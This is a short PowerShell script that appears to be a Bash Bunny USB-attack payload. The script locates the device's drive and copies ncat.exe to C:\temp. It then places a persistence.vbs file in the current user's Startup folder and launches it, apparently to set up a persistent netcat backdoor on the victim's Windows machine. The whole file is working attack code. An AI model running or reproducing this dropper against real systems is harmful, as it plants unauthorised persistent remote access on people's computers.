$Drive = (Get-WMIObject Win32_Volume | ? { $_.Label -eq 'BashBunny' }).name
$user = $env:UserName
$NetCatFile = $Drive + "payloads\switch1\ncat.exe"
$PersistenceFile = $Drive + "payloads\switch1\persistence.vbs"
$DestinationFile1 = "C:\temp\ncat.exe"
$DestinationFile2 = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence.vbs")

If ((Test-Path $DestinationFile1) -eq $false){
	New-Item -ItemType File -Path $DestinationFile1 -Force
}
If ((Test-Path $DestinationFile2) -eq $false){
	New-Item -ItemType File -Path $DestinationFile2 -Force
}

Copy-Item -Path $NetCatFile -Destination $DestinationFile1
Copy-Item -Path $PersistenceFile -Destination $DestinationFile2

Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

Start-Process cmd -ArgumentList "/c start persistence.vbs"